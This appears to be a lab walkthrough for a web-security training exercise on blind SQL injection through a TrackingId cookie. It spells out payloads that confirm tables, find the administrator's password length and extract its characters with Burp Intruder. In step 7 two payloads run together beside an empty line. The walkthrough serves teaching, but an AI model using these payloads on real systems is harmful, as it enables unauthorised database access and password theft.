# 3. Blind SQL injection with conditional responses

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, changing it to:`TrackingId=xyz' AND '1'='1`
    
    Verify that the `Welcome back` message appears in the response.
    
3. Now change it to:`TrackingId=xyz' AND '1'='2`
    
    Verify that the `Welcome back` message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
    
4. Now change it to:`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
    
    Verify that the condition is true, confirming that there is a table called `users`.
    
5. Now change it to:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
6. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
7. Send a series of follow-up values to test different password lengths. Send:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='aTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
    
    Then send:
    
    And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.
    
8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
9. In Burp Intruder, change the value of the cookie to:`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`